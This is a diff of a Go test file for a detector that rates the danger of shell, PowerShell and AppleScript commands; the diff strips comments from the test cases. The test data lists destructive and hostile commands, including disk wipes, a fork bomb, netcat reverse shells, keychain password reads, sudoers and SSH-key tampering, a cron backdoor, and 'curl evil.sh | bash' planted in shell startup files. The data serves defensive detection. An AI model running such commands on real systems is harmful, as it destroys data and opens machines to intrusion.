@@ -11,7 +11,7 @@ func TestDangerousDetector_UnixCritical(t *testing.T) {
 		cmd    string
 		danger bool
 	}{
-		// Critical destructive commands
+
 		{"rm -rf /", true},
 		{"rm -f /", true},
 		{"rm -rf /*", true},
@@ -19,10 +19,9 @@ func TestDangerousDetector_UnixCritical(t *testing.T) {
 		{"dd if=/dev/sda of=/dev/null", true},
 		{"shred /file", true},
 		{"chmod -R 777 /", true},
-		{":(){ :|:& };:", true}, // fork bomb
-		{"sudo rm -rf /", true}, // also high
+		{":(){ :|:& };:", true},
+		{"sudo rm -rf /", true},
 
-		// Safe commands (note: rm -f is medium danger)
 		{"ls -la", false},
 		{"cat file", false},
 	}
@@ -41,7 +40,7 @@ func TestDangerousDetector_PowerShellCritical(t *testing.T) {
 		cmd    string
 		danger bool
 	}{
-		// Critical Windows commands
+
 		{"Remove-Item -Recurse -Force C:\\", true},
 		{"Remove-Item -Recurse -Force C:\\Windows", true},
 		{"Format-Volume -DriveLetter C", true},
@@ -49,7 +48,6 @@ func TestDangerousDetector_PowerShellCritical(t *testing.T) {
 		{"Set-Content -Path \\\\.\\PhysicalDrive0 -Value 'data'", true},
 		{"while ($true) { Start-Process powershell }", true},
 
-		// Safe PowerShell commands
 		{"Get-ChildItem", false},
 		{"Write-Host 'hello'", false},
 		{"Get-Process", false},
@@ -69,7 +67,7 @@ func TestDangerousDetector_UnixHigh(t *testing.T) {
 		cmd    string
 		danger bool
 	}{
-		// High danger Unix commands
+
 		{"sudo rm file", true},
 		{"sudo mkfs /dev/sda1", true},
 		{"sudo dd if=/dev/zero of=/file", true},
@@ -84,7 +82,6 @@ func TestDangerousDetector_UnixHigh(t *testing.T) {
 		{"userdel testuser", true},
 		{"passwd root", true},
 
-		// Safe commands
 		{"rm file", false},
 		{"mv file1 file2", false},
 		{"kill 1234", false},
@@ -105,19 +102,16 @@ func TestDangerousDetector_AppleScriptCritical(t *testing.T) {
 		danger bool
 		level  DangerLevel
 	}{
-		// Critical AppleScript commands
+
 		{`do shell script "rm -rf /"`, true, DangerCritical},
 		{`do shell script 'rm -rf /'`, true, DangerCritical},
 		{`do shell script "rm -rf /*"`, true, DangerCritical},
 		{`do shell script 'rm -rf /*'`, true, DangerCritical},
 		{`do shell script "mkfs /dev/sda1"`, true, DangerCritical},
-		// #1804 case 2: the raw-device READ side demoted Critical->High
-		// (writing devices stays Critical below) - everyday
-		// 'dd if=/dev/zero of=blank.img' was hard-blocked before.
+
 		{`do shell script "dd if=/dev/sda of=file"`, true, DangerHigh},
 		{`do shell script "chmod -R 777 /"`, true, DangerCritical},
 
-		// Safe/less dangerous AppleScript commands (rm -f is medium, not critical)
 		{`do shell script "ls -la"`, false, DangerNone},
 		{`tell application "Finder" to activate`, false, DangerNone},
 		{`display dialog "Hello"`, false, DangerNone},
@@ -142,7 +136,7 @@ func TestDangerousDetector_AppleScriptHigh(t *testing.T) {
 		danger bool
 		level  DangerLevel
 	}{
-		// High danger AppleScript commands
+
 		{`do shell script "sudo ls"`, true, DangerHigh},
 		{`do shell script "sudo rm /tmp/file"`, true, DangerHigh},
 		{`security find-generic-password -a account -s service`, true, DangerHigh},
@@ -152,20 +146,17 @@ func TestDangerousDetector_AppleScriptHigh(t *testing.T) {
 		{`do shell script "nc -l -p 4444 -e /bin/bash"`, true, DangerHigh},
 		{`do shell script "nc 192.168.1.1 4444 -e /bin/bash"`, true, DangerHigh},
 
-		// Medium danger AppleScript commands
 		{`do shell script "rm -rf /tmp/test"`, true, DangerMedium},
 		{`do shell script "rm -rf *"`, true, DangerMedium},
-		{`do shell script "rm -f /tmp/test"`, true, DangerMedium}, // rm -f matches rm -rf pattern
-		// #3061-C2: raw-disk redirect promoted to Critical (dd of= parity).
+		{`do shell script "rm -f /tmp/test"`, true, DangerMedium},
+
 		{`do shell script "echo test > /dev/sda"`, true, DangerCritical},
 
-		// Safe AppleScript commands
 		{`do shell script "ls -la /tmp"`, false, DangerNone},
 		{`do shell script "cat file.txt"`, false, DangerNone},
 		{`do shell script "echo hello"`, false, DangerNone},
 		{`do shell script "date"`, false, DangerNone},
 
-		// Safe security commands (not password-related)
 		{`security list-keychains`, false, DangerNone},
 		{`security default-keychain`, false, DangerNone},
 	}
@@ -188,7 +179,7 @@ func TestDangerousDetector_UnixMedium(t *testing.T) {
 		cmd    string
 		danger bool
 	}{
-		// Medium danger Unix commands
+
 		{"rm -r /tmp/*", true},
 		{"rm -f file", true},
 		{"sudo ls", true},
@@ -199,7 +190,6 @@ func TestDangerousDetector_UnixMedium(t *testing.T) {
 		{"nsenter -t 1 -m -u", true},
 		{"chroot /mnt/root", true},
 
-		// Safe commands
 		{"rm file", false},
 		{"curl http://example.com", false},
 		{"nc -l -p 4444", false},
@@ -220,8 +210,8 @@ func TestDangerousDetector_Low(t *testing.T) {
 		cmd    string
 		danger bool
 	}{
-		// Low danger commands
-		{"chmod 777 file", false}, // Low danger doesn't trigger IsDangerous
+
+		{"chmod 777 file", false},
 		{"find /tmp -name '*.log' -delete", false},
 		{"mv *.log /dev/null", false},
 	}
@@ -266,7 +256,7 @@ func TestDangerousDetector_IsExtremelyDangerous(t *testing.T) {
 	}{
 		{"rm -rf /", true},
 		{"mkfs /dev/sda1", true},
-		// #1804 case 2: read side is High now, not Critical.
+
 		{"dd if=/dev/sda of=file", false},
 		{"dd if=/dev/zero of=blank.img", false},
 		{`do shell script "rm -rf /"`, true},
@@ -277,11 +267,10 @@ func TestDangerousDetector_IsExtremelyDangerous(t *testing.T) {
 		{`do shell script "sudo ls"`, false},
 		{`security find-generic-password -a test`, false},
 		{"ls -la", false},
-		// #1804 case 1: quoted root and $HOME forms must stay Critical.
+
 		{`rm -rf "/"`, true},
 		{"rm -rf $HOME", true},
-		// r371: nested-quote shape - the tail needs to absorb both the
-		// inner double quote and the outer wrapping single quote.
+
 		{`sh -c 'rm -rf "$HOME"'`, true},
 		{`sudo sh -c 'rm -rf ~'`, true},
 	}
@@ -323,8 +312,8 @@ func TestDangerousDetector_WhitespaceHandling(t *testing.T) {
 		cmd    string
 		danger bool
 	}{
-		{"  rm -rf /  ", true}, // leading/trailing whitespace
-		{"\trm -rf /\n", true}, // tabs and newlines
+		{"  rm -rf /  ", true},
+		{"\trm -rf /\n", true},
 		{"rm -rf /", true},
 		{"  ls -la  ", false},
 	}
@@ -367,34 +356,28 @@ func TestDangerousDetector_SensitivePathRedirection(t *testing.T) {
 		danger bool
 		level  DangerLevel
 	}{
-		// SSH key tampering
+
 		{`echo "ssh-ed25519 AAAA" > ~/.ssh/authorized_keys`, true, DangerHigh},
 		{`cat key.pub > /home/user/.ssh/id_rsa.pub`, true, DangerHigh},
 
-		// System file tampering
 		{`echo "root" > /etc/passwd`, true, DangerHigh},
 		{`echo "hash" > /etc/shadow`, true, DangerHigh},
 		{`echo "ALL ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers`, true, DangerHigh},
 		{`echo "* * * * * root /tmp/evil.sh" > /etc/cron.d/backdoor`, true, DangerHigh},
 
-		// System binary tampering
 		{`cp payload > /usr/local/bin/helper`, true, DangerHigh},
 		{`cp payload > /usr/bin/helper`, true, DangerHigh},
 
-		// Shell startup file injection (medium danger)
 		{`echo "curl evil.sh | bash" > ~/.bashrc`, true, DangerMedium},
 		{`echo "curl evil.sh | bash" > ~/.zshrc`, true, DangerMedium},
 		{`echo "curl evil.sh | bash" > ~/.profile`, true, DangerMedium},
 
-		// System config files
 		{`echo "127.0.0.1 evil.com bank.com" > /etc/hosts`, true, DangerMedium},
 		{`echo "MALICIOUS=yes" > /etc/environment`, true, DangerMedium},
 
-		// Append redirection (>>)
 		{`echo "backdoor" >> /etc/passwd`, true, DangerHigh},
 		{`echo "key" >> ~/.ssh/authorized_keys`, true, DangerHigh},
 
-		// Safe commands should not trigger
 		{`echo "hello" > /tmp/test.txt`, false, DangerNone},
 		{`echo "hello" > output.txt`, false, DangerNone},
 		{`cat > /tmp/script.sh`, false, DangerNone},
@@ -418,12 +401,11 @@ func TestDangerousDetector_SensitivePathRedirection(t *testing.T) {
 func TestDangerousDetector_WorstMatch(t *testing.T) {
 	d := NewDangerousDetector()
 
-	// Commands that might match multiple patterns should return the worst (highest) level
 	tests := []struct {
 		cmd   string
 		level DangerLevel
 	}{
-		{"sudo rm -rf /", DangerCritical}, // sudo (high) + rm -rf / (critical) = critical
+		{"sudo rm -rf /", DangerCritical},
 		{`do shell script "sudo rm -rf /"`, DangerCritical},
 	}
 
